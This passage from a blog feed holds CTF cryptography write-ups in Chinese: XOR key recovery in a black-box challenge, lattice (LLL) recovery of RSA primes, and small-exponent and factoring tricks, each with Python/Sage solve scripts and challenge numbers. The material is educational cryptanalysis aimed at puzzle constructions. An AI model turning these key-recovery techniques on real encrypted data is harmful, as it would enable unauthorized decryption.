class="hljs-built_in">pow</span>(y,k,p)<br>d=gp.invert(tmp,p)<br>m=(c1*d)%p<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto-lab7</title>
    <link href="/post/Crypto-lab7.html"/>
    <url>/post/Crypto-lab7.html</url>
    
    <content type="html"><![CDATA[<h1 id="Crypto-Lab7"><a href="#Crypto-Lab7" class="headerlink" title="Crypto-Lab7"></a>Crypto-Lab7</h1><h2 id="1-BlackBox"><a href="#1-BlackBox" class="headerlink" title="1.BlackBox"></a>1.BlackBox</h2><p>描述：._. 逆向是徒劳的，简单加了vm壳，学习黑盒测试的思想。</p><p>题目：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212152045732.png" alt="image-20221215204528702"></p><p>思路：</p><p>开始的时候没有看明白需要输入什么东西，随便输入显示长度错误，试探了一下，没试出来，之后发现16进制块有42个，符合flag的长度，输入一个之前别的题交过的flag</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212152051042.png" alt="image-20221215205131009"></p><p>发现flag{}对应位置得到的密文与开始给的相同，我开始还单纯的以为是每个字符对应一个16进制，之后才发现同一个字母出现在不同位置得到的加密结果不同，联想到维吉尼亚的周期性密钥，如果这里是密钥，而且如果同一个位置的同一个字母加密结果是一样的，那么肯定不是什么复杂的加密结构，很有可能是异或，用f的ASCII码值异或上对应的16进制25的ASCII值，为67，输入42个a，用67异或上97，得到的16进制结果正好是22，故可以证实自己的想法。这样通过已知的明密文异或得到密钥，再用密钥解密就能得到flag</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212152042045.png" alt="image-20221215204224978"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">cipher=<span class="hljs-string">&#x27;25 1e 18 17 0f 5a 25 14 1b 49 42 0d 26 5f 1f 41 12 59 6e 46 4b 40 12 42 21 17 49 44 59 0d 22 43 41 11 4d 5c 71 17 4e 47 11 12&#x27;</span><br>cipher=cipher.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment">#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br>setC=<span class="hljs-string">&#x27;22 13 18 11 15 0e 22 13 18 11 15 0e 22 13 18 11 15 0e 22 13 18 11 15 0e 22 13 18 11 15 0e 22 13 18 11 15 0e 22 13 18 11 15 0e&#x27;</span><br>setC=setC.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>key=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):<br>tmp=<span class="hljs-built_in">int</span>(setC[i],<span class="hljs-number">16</span>)^<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br>key.append(tmp)<br><span class="hljs-comment">#print(key)</span><br>res=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">42</span>):<br>tmp=<span class="hljs-built_in">int</span>(cipher[i],<span class="hljs-number">16</span>)^key[i]<br>tmp=<span class="hljs-built_in">chr</span>(tmp)<br>res+=tmp<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure><h2 id="2-LRSA"><a href="#2-LRSA" class="headerlink" title="2.LRSA"></a>2.LRSA</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br>m=bytes_to_long(flag)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getPQ</span>(<span class="hljs-params">p,q</span>):<br>    P=getPrime(<span class="hljs-number">2048</span>)<br>    Q=getPrime(<span class="hljs-number">2048</span>)<br>    t=(p*P-<span class="hljs-number">58</span>*P+q)%Q<br>    <span class="hljs-keyword">assert</span> (isPrime(Q))<br>    <span class="hljs-keyword">return</span> P,Q,t<br><br>B=getRandomNBitInteger(<span class="hljs-number">11</span>)<br>p=getPrime(B)<br>q=getPrime(B)<br>n=p*q<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>P,Q,t=getPQ(p,q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;B=&quot;</span>,B)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;P*P*Q=&quot;</span>,P*P*Q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;P*Q*Q=&quot;</span>,P*Q*Q)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;t=&quot;</span>,t)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c=&quot;</span>,c)<br></code></pre></td></tr></table></figure><p>思路：</p><p>已知P*P*Q和P*Q*Q可以通过两者相乘开三次方求出P*Q,或者求两者的公因子也可以求出P*Q</p><p>现在就是已知P,Q,t，求p,q,这里由于存在线性关系t=(p*P-58*P+q)%Q,是一个可以用格解决的问题</p><p>推导：</p><script type="math/tex; mode=display">t=(p*P-58*P+q)\%Q\\->t+k*Q=(p-58)*P+q\\->(p-58)*P-k*Q=t-q\\->(p-58\quad-k)*\left[ \begin{matrix}   1 & P\\   0 & Q\\  \end{matrix}  \right]=(p-58\quad{t-q})</script><p>格子是：</p><script type="math/tex; mode=display">M=\left[ \begin{matrix}   1 & P\\   0 & Q\\  \end{matrix}  \right]</script><p>向量<code>(p-58,t-q)</code>可以由两组基向量<code>M</code>的某种整系数线性组合<code>(p-58, -k)</code>来表示，因此向量<code>(p-58,t-q)</code>就在这个格上</p><p>再来看看<code>p,q,P,Q,t</code>的大小</p><ul><li><code>p or q</code>:1024~2047bit</li><li><code>P or Q</code>:2048bit</li><li><code>t</code>:44(6bit)</li></ul><script type="math/tex; mode=display">||(1,P)||=\sqrt{1^2+P^2}\approx2048bit\\||(0,Q)||=\sqrt{Q^2}\approx2048bit\\||(p-58,t-q)||=\sqrt{(p-58)^2+(t-q)^2}\approx\sqrt{2}*(p-6bit)\approx1018\sim2041bit</script><p>相对于两个基底向量<code>(1, P), (0, Q)</code>来说，向量<code>(p-58, t-q)</code>的长度要小得多得多,可以猜测向量<code>(p-58, t-q)</code>是这个格的最短向量，可以用LLL算法求出，这样就能求出p,q,之后再用RSA解密即可</p><p>exp:</p><p>现在sage中用LLL算法解出p,q</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br>PPQ=<span class="hljs-number">17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981</span><br>PQQ=<span class="hljs-number">17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909</span><br>t=<span class="hljs-number">44</span><br>PQ=gp.iroot(PPQ*PQQ,<span class="hljs-number">3</span>)[<span class="hljs-number">0</span>]<br>P=PPQ//PQ<br>Q=PQQ//PQ<br><span class="hljs-comment">#print(&#x27;P&#x27;,len(bin(P)[2:]))</span><br><span class="hljs-comment">#print(&#x27;Q&#x27;,len(bin(Q)[2:]))</span><br>M = matrix(ZZ, [[<span class="hljs-number">1</span>, P], [<span class="hljs-number">0</span>, Q]])<br>lll = M.LLL()[<span class="hljs-number">0</span>]<br>p = <span class="hljs-built_in">int</span>(-lll[<span class="hljs-number">0</span>]) + <span class="hljs-number">58</span><br>q = <span class="hljs-built_in">int</span>(lll[<span class="hljs-number">1</span>]) + t<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=&#x27;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q=&#x27;</span>,q)<br></code></pre></td></tr></table></figure><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212181528155.png" alt="image-20221218152834034"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>c=<span class="hljs-number">4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746</span><br>e=<span class="hljs-number">65537</span><br>p= <span class="hljs-number">80736411146583842306585010871034886981016840349026602734742256246556342668178774083233822097872779308174897649383396380481655663281333047577768952571915605685701400990749928642136680236367785948214890529631428970999122918591632651324318444462622996015719163492064450044087392474349767300242266723293755137263</span><br>q= <span class="hljs-number">71239161441539946834999944364158306978517617517717217001776063773301330324729178632534286023377366747004115034635139042058644768011502688969022553791977558750633767627495955645170437100983708648876951588485253787441732757259210010467734037546118780321368088487269039555130213851691659851510403573663333586451</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>n = p * q<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c, d, n))))<br></code></pre></td></tr></table></figure><h2 id="3-RSA"><a href="#3-RSA" class="headerlink" title="3.RSA+"></a>3.RSA+</h2><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> data <span class="hljs-keyword">import</span> e1,e2,p,q1p,q1q,hint,flag<br><br>n =  [<span class="hljs-number">20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423</span>, <span class="hljs-number">31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421</span>, <span class="hljs-number">29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303</span>, <span class="hljs-number">25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791</span>]<br>c =  [<span class="hljs-number">19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569</span>, <span class="hljs-number">15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031</span>, <span class="hljs-number">18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446</span>, <span class="hljs-number">2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797</span>]<br>f=<span class="hljs-keyword">lambda</span> m,e,n,c:<span class="hljs-built_in">pow</span>(m,e,n)==c<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">map</span>(f,[p]*<span class="hljs-number">4</span>,[<span class="hljs-number">4</span>]*<span class="hljs-number">4</span>,n,c))==<span class="hljs-number">4</span>)<br><span class="hljs-comment"># p^4 %n==c</span><br>ee1 = <span class="hljs-number">42</span><br>ee2 = <span class="hljs-number">3</span><br>ce1 =  <span class="hljs-number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span><br>ce2 =  <span class="hljs-number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span><br>tmp =  <span class="hljs-number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span><br>n  =  <span class="hljs-number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">pow</span>(e1,ee1,n)==ce1)<br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">pow</span>(e2+tmp,ee2,n)==ce2)<br><br>e = <span class="hljs-number">46531</span><br>n = <span class="hljs-number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span><br>c = <span class="hljs-number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span><br>hint=<span class="hljs-built_in">int</span>(binascii.hexlify(hint),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">assert</span>(q1p*q1q==n)<br><span class="hljs-keyword">assert</span>(q1p&lt;q1q)<br><span class="hljs-keyword">assert</span>(c==<span class="hljs-built_in">pow</span>(hint,e,n))<br><br>flag=<span class="hljs-built_in">int</span>(binascii.hexlify(flag),<span class="hljs-number">16</span>)<br>q1=q1p<br>q2 =  <span class="hljs-number">114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513</span><br>c1 =  <span class="hljs-number">262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124</span><br>c2 =  <span class="hljs-number">7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596</span><br><span class="hljs-keyword">assert</span>(c1==<span class="hljs-built_in">pow</span>(flag,e1,p*q1))<br><span class="hljs-keyword">assert</span>(c2==<span class="hljs-built_in">pow</span>(flag,e2,p*q2))<br></code></pre></td></tr></table></figure><p>思路：</p><p>看到有一个hint,先试着解一解，尝试分解n,发现正好能够分解成两个大素数</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202212191415776.png" alt="image-20221219141514674"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">46531</span><br>n = <span class="hljs-number">16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603</span><br>c = <span class="hljs-number">14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469</span><br>p=<span class="hljs-number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835693</span><br>q=<span class="hljs-number">127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gp.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>hint=long_to_bytes(m)<br><span class="hljs-built_in">print</span>(hint)<br></code></pre></td></tr></table></figure><p>正常按照rsa解出的结果如下，有亿点离谱，没有得到有用信息：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">b&#x27;orz...you.found.<span class="hljs-keyword">me</span>.<span class="hljs-keyword">but</span>.sorry.no.hint...keep.<span class="hljs-keyword">on</span>.<span class="hljs-keyword">and</span>.enjoy.<span class="hljs-keyword">it</span>!&#x27;<br></code></pre></td></tr></table></figure><p>但还是知道了q1的值，现在相当于已知q1,q2,和之前有一题类似，可以试试拆分开来，再用共模,但需要已知e1,e2,需要用到前面的条件</p><p>给出了</p><script type="math/tex; mode=display">ce1=e_1^{ee1}\%n\\ce2=(e_2+tmp)^{ee2}\%n</script><p>这里的ee1=42,ee2=3都很小，可能求幂后没有超过n,这样直接开方就能求出来，可以从已知量的长度来判断</p><p>（e的长度一般16bit可由此估算）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ce1_len= <span class="hljs-number">1840</span><br>ce2_len= <span class="hljs-number">2047</span><br>e1^42_len_approx= <span class="hljs-number">672</span><br>tmp_len= <span class="hljs-number">688</span><br>(e2+tmp)^3_<span class="hljs-built_in">len</span>= <span class="hljs-number">2064</span><br></code></pre></td></tr></table></figure><p>由于e1^42可能的长度远小于1840，故其很可能就是直接开42次方的结果，而2064大于2047，不是大很多，则可通过加上k*n，找出能正好开3次方的情况求出e2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2 <span class="hljs-keyword">as</span> gp<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>ce1 =  <span class="hljs-number">45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384</span><br>ce2 =  <span class="hljs-number">13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158</span><br>tmp =  <span class="hljs-number">864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387</span><br>n  =  <span class="hljs-number">15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039</span><br><span 